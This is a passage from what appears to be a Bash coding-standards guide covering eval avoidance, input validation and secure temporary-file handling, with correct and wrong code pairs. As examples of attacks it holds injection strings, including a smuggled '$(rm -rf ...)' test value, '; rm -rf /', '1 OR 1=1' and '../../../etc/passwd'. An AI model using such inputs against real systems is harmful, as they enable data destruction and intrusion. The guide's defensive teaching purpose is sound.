eval "$cmd"  # DANGEROUS!

# ✓ Correct - use array
declare -a cmd=(find /data -type f)
[[ -n "$name_pattern" ]] && cmd+=(-name "$name_pattern")
[[ -n "$size" ]] && cmd+=(-size "$size")
"${cmd[@]}"  # Safe execution
```

**The rare legitimate use of eval (with extreme caution):**

```bash
# Parsing output with known-safe format from trusted source
# Example: getconf outputs shell variable assignments
eval "$(getconf ARG_MAX)"  # Sets ARG_MAX variable

# Still better to parse manually:
ARG_MAX=$(getconf ARG_MAX)

# Another rare case: generating code from templates (development/build only)
# NEVER in production with user input!
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - eval with any user input
eval "$user_command"

# ✓ Correct - validate against whitelist
case "$user_command" in
  start|stop|restart|status) systemctl "$user_command" myapp ;;
  *) die 22 "Invalid command: $user_command" ;;
esac

# ✗ Wrong - eval for variable assignment
eval "$var_name='$var_value'"

# ✓ Correct - use printf -v
printf -v "$var_name" '%s' "$var_value"

# ✗ Wrong - eval to source file with expansion
eval "source $config_file"

# ✓ Correct - source directly or use safe expansion
source "$config_file"

# ✗ Wrong - eval in loop
for file in *.txt; do
  eval "process_${file%.txt}"  # Trying to call function dynamically
done

# ✓ Correct - use array lookup or case statement
declare -A processors=(
  [data]=process_data
  [log]=process_log
)
for file in *.txt; do
  base="${file%.txt}"
  if [[ -v "processors[$base]" ]]; then
    "${processors[$base]}"
  fi
done

# ✗ Wrong - eval to check if variable is set
eval "if [[ -n \\$$var_name ]]; then echo set; fi"

# ✓ Correct - use -v test
if [[ -v "$var_name" ]]; then
  echo set
fi

# ✗ Wrong - double expansion with eval
eval "echo \$$var_name"

# ✓ Correct - indirect expansion
echo "${!var_name}"
```

**Complete safe example (no eval):**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Configuration using associative array (no eval)
declare -A config=(
  [app_name]='myapp'
  [app_port]='8080'
  [app_host]='localhost'
)

# Dynamic function dispatch (no eval)
declare -A actions=(
  [start]=start_service
  [stop]=stop_service
  [restart]=restart_service
  [status]=status_service
)

start_service() {
  info "Starting ${config[app_name]} on ${config[app_host]}:${config[app_port]}"
  # Start logic here
}

stop_service() {
  info "Stopping ${config[app_name]}"
  # Stop logic here
}

restart_service() {
  stop_service
  start_service
}

status_service() {
  # Check status logic here
  info "${config[app_name]} is running"
}

# Build command dynamically with array (no eval)
build_curl_command() {
  local -- url=$1
  local -a curl_cmd=(curl)

  # Add options based on configuration
  [[ -v config[proxy] ]] && curl_cmd+=(--proxy "${config[proxy]}") ||:
  [[ -v config[timeout] ]] && curl_cmd+=(--timeout "${config[timeout]}") ||:

  # Add URL
  curl_cmd+=("$url")

  # Execute safely
  "${curl_cmd[@]}"
}

main() {
  local -- action=${1:-status}

  # Dispatch to function (no eval)
  if [[ -v "actions[$action]" ]]; then
    "${actions[$action]}"
  else
    die 22 "Invalid action: $action. Valid: ${!actions[*]}"
  fi
}

main "$@"

#fin
```

**Detecting eval usage:**

```bash
# Find all eval usage in scripts
grep -rn 'eval' /path/to/scripts/

# Check if eval is used with variables (very dangerous)
grep -rn 'eval.*\$' /path/to/scripts/

# ShellCheck will warn about eval
shellcheck -x script.sh
# SC2086: eval should not be used for variable expansion
```

**Testing for eval vulnerabilities:**

```bash
# Test script with malicious input
test_eval_safety() {
  local -- malicious_input='$(rm -rf /tmp/test_eval_*)'

  # Create test directory
  mkdir -p /tmp/test_eval_target
  touch /tmp/test_eval_target/testfile

  # Run function with malicious input
  process_input "$malicious_input"

  # Check if malicious command executed
  if [[ ! -d /tmp/test_eval_target ]]; then
    error 'SECURITY VULNERABILITY: eval executed malicious code!'
    return 1
  else
    success 'Input properly sanitized - no eval execution'
    return 0
  fi

  # Cleanup
  rm -rf /tmp/test_eval_target
}
```

**Summary:**

- **Never use eval with untrusted input** - no exceptions
- **Avoid eval entirely** - better alternatives exist for almost all use cases
- **Use arrays** for dynamic command construction: `cmd=(find); cmd+=(-name "*.txt"); "${cmd[@]}"`
- **Use indirect expansion** for variable references: `echo "${!var_name}"`
- **Use associative arrays** for dynamic data: `declare -A data; data[$key]=$value`
- **Use case/arrays** for function dispatch instead of eval
- **Validate strictly** if eval is absolutely unavoidable (which it almost never is)
- **Audit regularly** for eval usage in codebases
- **Enable ShellCheck** to catch eval misuse

**Key principle:** If you think you need `eval`, you're solving the wrong problem. There is almost always a safer alternative using proper Bash features like arrays, indirect expansion, or associative arrays.


---


**Rule: BCS1005**

## Input Sanitization

**Always validate and sanitize user input to prevent security issues.**

**Rationale:**
- **Prevent injection attacks**: User input could contain malicious code
- **Prevent directory traversal**: `../../../etc/passwd` type attacks
- **Validate data types**: Ensure input matches expected format
- **Fail early**: Reject invalid input before processing
- **Defense in depth**: Never trust user input

**1. Filename validation:**

```bash
# Validate filename - no directory traversal, no special chars
sanitize_filename() {
  local -- name=$1

  # Reject empty input
  [[ -n "$name" ]] || die 22 'Filename cannot be empty'

  # Remove directory traversal attempts
  name="${name//\.\./}"  # Remove all ..
  name="${name//\//}"    # Remove all /

  # Allow only safe characters: alphanumeric, dot, underscore, hyphen
  [[ "$name" =~ ^[a-zA-Z0-9._-]+$ ]] || die 22 "Invalid filename ${name@Q}: contains unsafe characters"

  # Reject hidden files (starting with .)
  [[ "$name" =~ ^\\. ]] && die 22 "Filename cannot start with dot ${name@Q}"

  # Reject names that are too long
  ((${#name} > 255)) && die 22 "Filename too long (max 255 chars) ${name@Q}"

  echo "$name"
}

# Usage
user_filename=$(sanitize_filename "$user_input")
safe_path="$SAFE_DIR/$user_filename"
```

**2. Numeric input validation:**

```bash
# Validate integer (positive or negative)
validate_integer() {
  local -- input=$1
  [[ -n "$input" ]] || die 22 'Number cannot be empty'

  if [[ ! "$input" =~ ^-?[0-9]+$ ]]; then
    die 22 "Invalid integer: '$input'"
  fi
  echo "$input"
}

# Validate positive integer
validate_positive_integer() {
  local -- input=$1
  [[ -n "$input" ]] || die 22 'Number cannot be empty'

  if [[ ! "$input" =~ ^[0-9]+$ ]]; then
    die 22 "Invalid positive integer: '$input'"
  fi

  # Check for leading zeros (often indicates octal interpretation)
  [[ "$input" =~ ^0[0-9] ]] && die 22 "Number cannot have leading zeros: $input"

  echo "$input"
}

# Validate with range check
validate_port() {
  local -- port=$1
  port=$(validate_positive_integer "$port")

  ((port >= 1 && port <= 65535)) || die 22 "Port must be 1-65535: $port"
  echo "$port"
}
```

**3. Path validation:**

```bash
# Validate path is within allowed directory
validate_path() {
  local -- input_path=$1
  local -- allowed_dir=$2

  # Resolve to absolute path
  local -- real_path
  real_path=$(realpath -e -- "$input_path") || die 22 "Invalid path ${input_path@Q}"

  # Ensure path is within allowed directory
  if [[ "$real_path" != "$allowed_dir"* ]]; then
    die 5 "Path outside allowed directory ${real_path@Q}"
  fi

  echo "$real_path"
}

# Usage
safe_path=$(validate_path "$user_path" "/var/app/data")
```

**4. Email validation:**

```bash
validate_email() {
  local -- email=$1
  [[ -n "$email" ]] || die 22 'Email cannot be empty'

  # Basic email regex (not RFC-compliant but sufficient for most cases)
  local -- email_regex='^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'

  if [[ ! "$email" =~ $email_regex ]]; then
    die 22 "Invalid email format: $email"
  fi

  # Check length limits
  ((${#email} <= 254)) || die 22 "Email too long (max 254 chars): $email"

  echo "$email"
}
```

**5. URL validation:**

```bash
validate_url() {
  local -- url=$1
  [[ -n "$url" ]] || die 22 'URL cannot be empty'

  # Only allow http and https schemes
  if [[ ! "$url" =~ ^https?:// ]]; then
    die 22 "URL must start with http:// or https://: ${url@Q}"
  fi

  # Reject URLs with credentials (security risk)
  if [[ "$url" =~ @ ]]; then
    die 22 'URL cannot contain credentials'
  fi

  echo "$url"
}
```

**6. Whitelist validation:**

```bash
# Validate input against whitelist
validate_choice() {
  local -- input=$1
  shift
  local -a valid_choices=("$@")

  local choice
  for choice in "${valid_choices[@]}"; do
    [[ "$input" == "$choice" ]] && return 0
  done

  die 22 "Invalid choice ${input@Q}. Valid: ${valid_choices[*]}"
}

# Usage
declare -a valid_actions=('start' 'stop' 'restart' 'status')
validate_choice "$user_action" "${valid_actions[@]}"
```

**7. Username validation:**

```bash
validate_username() {
  local -- username=$1
  [[ -n "$username" ]] || die 22 'Username cannot be empty'

  # Standard Unix username rules
  if [[ ! "$username" =~ ^[a-z_][a-z0-9_-]*$ ]]; then
    die 22 "Invalid username ${username@Q}"
  fi

  # Check length (typically max 32 chars on Unix)
  ((${#username} >= 1 && ${#username} <= 32)) || \
    die 22 "Username must be 1-32 characters ${username@Q}"

  echo "$username"
}
```

**8. Command injection prevention:**

```bash
# NEVER pass user input directly to shell
# ✗ DANGEROUS - command injection vulnerability
user_file=$1
cat "$user_file"  # If user_file="; rm -rf /", disaster!

# ✓ Safe - validate first
validate_filename "$user_file"
cat -- "$user_file"  # Use -- to prevent option injection

# ✗ DANGEROUS - using eval with user input
eval "$user_command"  # NEVER DO THIS!

# ✓ Safe - whitelist allowed commands
case "$user_command" in
  start|stop|restart) systemctl "$user_command" myapp ;;
  *) die 22 "Invalid command: $user_command" ;;
esac
```

**9. Option injection prevention:**

```bash
# User input could be malicious option like "--delete-all"
user_file=$1

# ✗ Dangerous - if user_file="--delete-all", disaster!
rm "$user_file"

# ✓ Safe - use -- separator
rm -- "$user_file"

# ✗ Dangerous - filename starting with -
ls "$user_file"  # If user_file="-la", becomes: ls -la

# ✓ Safe - use -- or prepend ./
ls -- "$user_file"
ls ./"$user_file"
```

**10. SQL injection prevention (if generating SQL):**

```bash
# ✗ DANGEROUS - SQL injection vulnerability
user_id=$1
query="SELECT * FROM users WHERE id=$user_id"  # user_id="1 OR 1=1"

# ✓ Safe - validate input type first
user_id=$(validate_positive_integer "$user_id")
query="SELECT * FROM users WHERE id=$user_id"

# ✓ Better - use parameterized queries (with proper DB tools)
# This is just bash demo - use proper DB library in production
```

**Complete validation example:**

```bash
#!/usr/bin/env bash
set -euo pipefail

# Validation functions
validate_positive_integer() {
  local input=$1
  [[ -n "$input" && "$input" =~ ^[0-9]+$ ]] || \
    die 22 "Invalid positive integer: $input"
  echo "$input"
}

sanitize_filename() {
  local name=$1
  name="${name//\.\./}"
  name="${name//\//}"
  [[ "$name" =~ ^[a-zA-Z0-9._-]+$ ]] || \
    die 22 "Invalid filename ${name@Q}"
  echo "$name"
}

# Parse and validate arguments
while (($#)); do case $1 in
  -c|--count)     noarg "$@"; shift
                  count=$(validate_positive_integer "$1") ;;
  -f|--file)      noarg "$@"; shift
                  filename=$(sanitize_filename "$1") ;;
  -*)             die 22 "Invalid option ${1@Q}" ;;
  *)              die 2 "Unexpected argument ${1@Q}" ;;
esac; shift; done

# Validate required arguments provided
[[ -n "${count:-}" ]] || die 2 'Missing required option: --count'
[[ -n "${filename:-}" ]] || die 2 'Missing required option: --file'

# Use validated input safely
for ((i=0; i<count; i+=1)); do
  echo "Processing iteration $i" >> "$filename"
done
```

**Anti-patterns to avoid:**

```bash
# ✗ WRONG - trusting user input
rm -rf "$user_dir"  # user_dir="/" = disaster!

# ✓ Correct - validate first
validate_path "$user_dir" "/safe/base/dir"
rm -rf "$user_dir"

# ✗ WRONG - weak validation
[[ -n "$filename" ]] && process "$filename"  # Not enough!

# ✓ Correct - thorough validation
filename=$(sanitize_filename "$filename")
process "$filename"

# ✗ WRONG - blacklist approach (always incomplete)
[[ "$input" != *'rm'* ]] || die 1 'Invalid input'  # Can be bypassed!

# ✓ Correct - whitelist approach
[[ "$input" =~ ^[a-zA-Z0-9]+$ ]] || die 1 'Invalid input'
```

**Security principles:**

1. **Whitelist over blacklist**: Define what IS allowed, not what isn't
2. **Validate early**: Check input before any processing
3. **Fail securely**: Reject invalid input with clear error
4. **Use `--` separator**: Prevent option injection in commands
5. **Never use `eval`**: Especially not with user input
6. **Absolute paths**: When possible, use full paths to prevent PATH manipulation
7. **Principle of least privilege**: Run with minimum necessary permissions

**Summary:**
- **Always validate** user input before use
- **Use whitelist** validation (regex, allowed values)
- **Check type, format, range, length**
- **Use `--` separator** in commands
- **Never trust** user input, even if it "looks safe"


---


**Rule: BCS1006**

## Temporary File Handling

**Always use `mktemp` to create temporary files and directories, never hard-code temp file paths. Use trap handlers to ensure cleanup occurs even on script failure or interruption. Store temp file paths in variables, make them readonly when possible, and always clean up in EXIT trap. Proper temp file handling prevents security vulnerabilities, avoids file collisions, and ensures resources are released.**

**Rationale:**

- **Security**: mktemp creates files with secure permissions (0600) in safe locations
- **Uniqueness**: Guaranteed unique filenames prevent collisions with other processes
- **Atomicity**: mktemp creates file atomically, preventing race conditions
- **Cleanup Guarantee**: EXIT trap ensures cleanup even when script fails or is interrupted
- **Resource Management**: Automatic cleanup prevents temp file accumulation
- **Portability**: mktemp works consistently across Unix-like systems
- **Predictable Location**: Uses system temp directory (TMPDIR or /tmp) appropriately

**Basic temp file creation:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Create temp file and ensure cleanup
create_temp_file() {
  local -- temp_file

  # Create temp file
  temp_file=$(mktemp) || die 1 'Failed to create temporary file'

  # Set up cleanup
  trap 'rm -f "$temp_file"' EXIT

  # Make variable readonly
  readonly -- temp_file

  info "Created temp file ${temp_file@Q}"

  # Use temp file
  echo 'Test data' > "$temp_file"
  cat "$temp_file"

  # Cleanup happens automatically via trap
}

main() {
  create_temp_file
}

main "$@"
#fin
```

**Basic temp directory creation:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Create temp directory and ensure cleanup
create_temp_dir() {
  local -- temp_dir

  # Create temp directory
  temp_dir=$(mktemp -d) || die 1 'Failed to create temporary directory'

  # Set up cleanup
  trap 'rm -rf "$temp_dir"' EXIT

  # Make variable readonly
  readonly -- temp_dir

  info "Created temp directory ${temp_dir@Q}"

  # Use temp directory
  echo 'file1' > "$temp_dir"/file1.txt
  echo 'file2' > "$temp_dir"/file2.txt

  ls -la "$temp_dir"

  # Cleanup happens automatically via trap
}

main() {
  create_temp_dir
}

main "$@"

#fin
```

**Custom temp file templates:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Temp file with custom template
create_custom_temp() {
  local -- temp_file

  # Template: myapp.XXXXXX (at least 3 X's required)
  temp_file=$(mktemp /tmp/"$SCRIPT_NAME".XXXXXX) ||
    die 1 'Failed to create temporary file'

  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  info "Created temp file ${temp_file@Q}"
  # Output example: /tmp/myscript.Ab3X9z

  # Use temp file
  echo 'Data' > "$temp_file"
}

# ✓ CORRECT - Temp directory with custom template
create_custom_temp_dir() {
  local -- temp_dir

  # Template for directory
  temp_dir=$(mktemp -d /tmp/"$SCRIPT_NAME"-work.XXXXXX) ||
    die 1 'Failed to create temporary directory'

  trap 'rm -rf "$temp_dir"' EXIT
  readonly -- temp_dir

  info "Created temp directory ${temp_dir@Q}"
  # Output example: /tmp/myscript-work.Xy7Pm2
}

# ✓ CORRECT - Temp file with extension
create_temp_with_extension() {
  local -- temp_file

  # mktemp doesn't support extensions directly, so add it
  temp_file=$(mktemp /tmp/"$SCRIPT_NAME".XXXXXX)
  mv "$temp_file" "$temp_file".json
  temp_file="$temp_file".json

  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  info "Created temp file: ${temp_file@Q}"

  # Use temp file
  echo '{"key": "value"}' > "$temp_file"
}

main() {
  create_custom_temp
  create_custom_temp_dir
  create_temp_with_extension
}

main "$@"
#fin
```

**Multiple temp files with cleanup:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Global array for temp files
declare -a TEMP_FILES=()

# Cleanup function for all temp files
cleanup_temp_files() {
  local -i exit_code=$?
  local -- file

  if [[ ${#TEMP_FILES[@]} -gt 0 ]]; then
    info "Cleaning up ${#TEMP_FILES[@]} temporary files"

    for file in "${TEMP_FILES[@]}"; do
      if [[ -f "$file" ]]; then
        rm -f "$file"
      elif [[ -d "$file" ]]; then
        rm -rf "$file"
      fi
    done
  fi

  return "$exit_code"
}

# Set up cleanup trap
trap cleanup_temp_files EXIT

# Create and register temp file
create_temp() {
  local -- temp_file

  temp_file=$(mktemp) || die 1 'Failed to create temporary file'
  TEMP_FILES+=("$temp_file")

  echo "$temp_file"
}

# Create and register temp directory
create_temp_dir() {
  local -- temp_dir

  temp_dir=$(mktemp -d) || die 1 'Failed to create temporary directory'
  TEMP_FILES+=("$temp_dir")

  echo "$temp_dir"
}

main() {
  local -- temp1 temp2 temp_dir

  # Create multiple temp files
  temp1=$(create_temp)
  temp2=$(create_temp)
  temp_dir=$(create_temp_dir)

  readonly -- temp1 temp2 temp_dir

  info "Temp file 1: ${temp1@Q}"
  info "Temp file 2: ${temp2@Q}"
  info "Temp directory: ${temp_dir@Q}"

  # Use temp files
  echo 'Data 1' > "$temp1"
  echo 'Data 2' > "$temp2"
  echo 'File in dir' > "$temp_dir/file.txt"

  # Cleanup happens automatically via trap
}

main "$@"
#fin
```

**Temp files with error handling:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Robust temp file creation with validation
create_temp_robust() {
  local -- temp_file

  # Create temp file
  if ! temp_file=$(mktemp 2>&1); then
    die 1 "Failed to create temporary file ${temp_file@Q}"
  fi

  # Validate temp file was created
  if [[ ! -f "$temp_file" ]]; then
    die 1 "Temp file does not exist ${temp_file@Q}"
  fi

  # Check permissions (should be 0600)
  local -- perms
  perms=$(stat -c %a "$temp_file" 2>/dev/null || stat -f %Lp "$temp_file" 2>/dev/null)
  if [[ "$perms" != '600' ]]; then
    rm -f "$temp_file"
    die 1 "Temp file has insecure permissions: $perms"
  fi

  # Set up cleanup
  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  info "Created secure temp file ${temp_file@Q} (permissions $perms)"

  echo "$temp_file"
}

main() {
  local -- temp_file
  temp_file=$(create_temp_robust)

  # Use temp file
  echo 'Sensitive data' > "$temp_file"
}

main "$@"
#fin
```

**Complete example - Data processor with temp files:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Global Variables
# ============================================================================

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i KEEP_TEMP=0
declare -a TEMP_RESOURCES=()

# ============================================================================
# Messaging Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    info) prefix+=" ◉" ;;
    warn) prefix+=" ▲" ;;
    error) prefix+=" ✗" ;;
    success) prefix+=" ✓" ;;
    debug) prefix+=" ⋯" ;;
    *) ;;
  esac
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
success() { >&2 _msg "$@"; }
debug() { ((VERBOSE >= 2)) || return 0; >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ============================================================================
# Cleanup Functions
# ============================================================================

cleanup() {
  local -i exit_code=$?
  local -- resource

  if ((KEEP_TEMP)); then
    if ((${#TEMP_RESOURCES[@]})); then
      info 'Keeping temporary files (--keep-temp specified):'
      for resource in "${TEMP_RESOURCES[@]}"; do
        info "  $resource"
      done
    fi
    return "$exit_code"
  fi

  if ((${#TEMP_RESOURCES[@]})); then
    debug "Cleaning up ${#TEMP_RESOURCES[@]} temporary resources"

    for resource in "${TEMP_RESOURCES[@]}"; do
      if [[ -f "$resource" ]]; then
        debug "Removing temp file ${resource@Q}"
        rm -f "$resource"
      elif [[ -d "$resource" ]]; then
        debug "Removing temp directory ${resource@Q}"
        rm -rf "$resource"
      fi
    done
  fi

  return "$exit_code"
}

# Set up cleanup trap
trap cleanup EXIT

# ============================================================================
# Temp Resource Management
# ============================================================================

# Create temp file and register for cleanup
make_temp_file() {
  local -- template=${1:-}
  local -- temp_file

  if [[ -n "$template" ]]; then
    temp_file=$(mktemp /tmp/"$template".XXXXXX) ||
      die 1 "Failed to create temp file with template ${template@Q}"
  else
    temp_file=$(mktemp) ||
      die 1 'Failed to create temp file'
  fi

  # Register for cleanup
  TEMP_RESOURCES+=("$temp_file")

  debug "Created temp file ${temp_file@Q}"
  echo "$temp_file"
}

# Create temp directory and register for cleanup
make_temp_dir() {
  local -- template=${1:-}
  local -- temp_dir

  if [[ -n "$template" ]]; then
    temp_dir=$(mktemp -d /tmp/"$template".XXXXXX) ||
      die 1 "Failed to create temp directory with template ${template@Q}"
  else
    temp_dir=$(mktemp -d) ||
      die 1 'Failed to create temp directory'
  fi

  # Register for cleanup
  TEMP_RESOURCES+=("$temp_dir")

  debug "Created temp directory ${temp_dir@Q}"
  echo "$temp_dir"
}

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option ${1@Q} requires an argument"
  fi
}

# ============================================================================
# Business Logic
# ============================================================================

# Process file with multiple temp files
process_file() {
  local -- input_file=$1
  local -- output_file=$2

  # Validate input
  if [[ ! -f "$input_file" ]]; then
    error "Input file not found ${input_file@Q}"
    return 2
  fi

  if [[ ! -r "$input_file" ]]; then
    error "Input file not readable ${input_file@Q}"
    return 1
  fi

  info "Processing: $input_file -> $output_file"

  # Create temp files for processing stages
  local -- temp_filtered temp_sorted temp_unique
  temp_filtered=$(make_temp_file "$SCRIPT_NAME-filtered")
  temp_sorted=$(make_temp_file "$SCRIPT_NAME-sorted")
  temp_unique=$(make_temp_file "$SCRIPT_NAME-unique")

  # Stage 1: Filter comments and empty lines
  debug 'Stage 1: Filtering'
  grep -v '^#' "$input_file" | grep -v '^[[:space:]]*$' > "$temp_filtered"

  local -i filtered_lines
  filtered_lines=$(wc -l < "$temp_filtered")
  debug "Filtered lines: $filtered_lines"

  # Stage 2: Sort
  debug 'Stage 2: Sorting'
  sort "$temp_filtered" > "$temp_sorted"

  # Stage 3: Remove duplicates
  debug 'Stage 3: Removing duplicates'
  sort -u "$temp_sorted" > "$temp_unique"

  local -i unique_lines
  unique_lines=$(wc -l < "$temp_unique")
  debug "Unique lines: $unique_lines"

  # Write final output
  if ((DRY_RUN)); then
    info "[DRY-RUN] Would write to: $output_file"
    info "[DRY-RUN] Output preview:"
    head -n 5 "$temp_unique"
  else
    cp "$temp_unique" "$output_file"
    success "Processed $input_file -> $output_file ($unique_lines unique lines)"
  fi

  return 0
}

# Batch process multiple files
batch_process() {
  local -a input_files=("$@")
  local -- input_file output_file
  local -i success_count=0
  local -i error_count=0

  # Create temp directory for outputs
  local -- temp_output_dir
  temp_output_dir=$(make_temp_dir "$SCRIPT_NAME"-output)

  info "Processing ${#input_files[@]} files"

  for input_file in "${input_files[@]}"; do
    output_file="$temp_output_dir"/"${input_file##*/}".processed

    if process_file "$input_file" "$output_file"; then
      ((success_count+=1))
    else
      ((error_count+=1))
    fi
  done

  # Report results
  info "Results: $success_count succeeded, $error_count failed"

  if ((success_count > 0)); then
    info 'Processed files:'
    ls -lh "$temp_output_dir"
  fi

  # Return appropriate exit code
  ((error_count == 0))
}

# ============================================================================
# Main Function
# ============================================================================

show_help() {
  cat <<HELP
$SCRIPT_NAME $VERSION - Process files with temp files

Usage: $SCRIPT_NAME [OPTIONS] FILE...

Process files with temporary file handling.

Options:
  -v, --verbose       Verbose output
  -vv                 Very verbose (debug) output
  -n, --dry-run       Dry-run mode
  -k, --keep-temp     Keep temporary files after completion
  -h, --help          Show this help message
  -V, --version       Show version

Arguments:
  FILE...             Input files to process

Examples:
  script.sh file.txt
  script.sh -v file1.txt file2.txt
  script.sh -k --dry-run data/*.txt
HELP
}

main() {
  local -a input_files=()

  # Parse arguments
  while (($#)); do
    case $1 in
      -v|--verbose)
        VERBOSE+=1
        ;;

      -vv)
        VERBOSE=2
        ;;

      -n|--dry-run)
        DRY_RUN=1
        ;;

      -k|--keep-temp)
        KEEP_TEMP=1
        ;;

      -V|--version)
        echo "$SCRIPT_NAME $VERSION"
        return 0
        ;;

      -h|--help)
        show_help
        return 0
        ;;

      --)
        shift
        break
        ;;

      -*)
        die 22 "Invalid option ${1@Q}"
        ;;

      *)
        input_files+=("$1")
        ;;
    esac
    shift
  done

  # Collect remaining arguments
  input_files+=("$@")

  # Make variables readonly
  readonly -- VERBOSE DRY_RUN KEEP_TEMP
  readonly -a input_files

  # Validate
  if ((${#input_files[@]} == 0)); then
    error 'No input files specified'
    show_help
    return 22
  fi

  # Display configuration
  if ((VERBOSE)); then
    info "$SCRIPT_NAME $VERSION"
    info "Input files: ${#input_files[@]}"
    ((DRY_RUN)) && info '[DRY-RUN] Mode enabled' ||:
    ((KEEP_TEMP)) && info '[KEEP-TEMP] Temporary files will be preserved' ||:
  fi

  # Process files
  batch_process "${input_files[@]}"
}

# ============================================================================
# Script Invocation
# ============================================================================

main "$@"
#fin
```

**Temp file security considerations:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Secure temp file handling
secure_temp_file() {
  local -- temp_file

  # Create with secure permissions (0600)
  temp_file=$(mktemp) || die 1 'Failed to create temp file'

  # Verify it's a regular file
  if [[ ! -f "$temp_file" ]]; then
    die 1 "Temp file is not a regular file ${temp_file@Q}"
  fi

  # Verify ownership (should be current user)
  local -- owner
  owner=$(stat -c %U "$temp_file" 2>/dev/null || stat -f %Su "$temp_file" 2>/dev/null)
  if [[ "$owner" != "$USER" ]]; then
    rm -f "$temp_file"
    die 1 "Temp file has wrong owner: $owner (expected: $USER)"
  fi

  # Verify permissions (0600)
  local -- perms
  perms=$(stat -c %a "$temp_file" 2>/dev/null || stat -f %Lp "$temp_file" 2>/dev/null)
  if [[ "$perms" != '600' ]]; then
    rm -f "$temp_file"
    die 1 "Temp file has insecure permissions: $perms"
  fi

  # Set up cleanup
  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  info "Created secure temp file: ${temp_file@Q}"
  info "  Owner: $owner"
  info "  Permissions: $perms"

  echo "$temp_file"
}

# ✓ CORRECT - Secure temp directory handling
secure_temp_dir() {
  local -- temp_dir

  # Create with secure permissions (0700)
  temp_dir=$(mktemp -d) || die 1 'Failed to create temp directory'

  # Verify it's a directory
  if [[ ! -d "$temp_dir" ]]; then
    die 1 "Temp path is not a directory ${temp_dir@Q}"
  fi

  # Verify permissions (0700)
  local -- perms
  perms=$(stat -c %a "$temp_dir" 2>/dev/null || stat -f %Lp "$temp_dir" 2>/dev/null)
  if [[ "$perms" != '700' ]]; then
    rm -rf "$temp_dir"
    die 1 "Temp directory has insecure permissions: $perms"
  fi

  # Set up cleanup
  trap 'rm -rf "$temp_dir"' EXIT
  readonly -- temp_dir

  info "Created secure temp directory ${temp_dir@Q} permissions $perms)"

  echo "$temp_dir"
}

main() {
  local -- temp_file temp_dir

  temp_file=$(secure_temp_file)
  temp_dir=$(secure_temp_dir)

  # Use temp resources
  echo 'Sensitive data' > "$temp_file"
  echo 'More data' > "$temp_dir/file.txt"
}

main "$@"

#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ WRONG - Hard-coded temp file path
temp_file=/tmp/myapp_temp.txt
echo 'data' > "$temp_file"
# Problems:
# - Not unique (collisions with other instances)
# - Predictable name (security risk)
# - No automatic cleanup

# ✓ CORRECT - Use mktemp
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT
echo 'data' > "$temp_file"

# ✗ WRONG - Using PID in filename
temp_file=/tmp/myapp_"$$".txt
echo 'data' > "$temp_file"
# Problems:
# - Still predictable
# - Race condition between check and create
# - No automatic cleanup

# ✓ CORRECT - Use mktemp with template
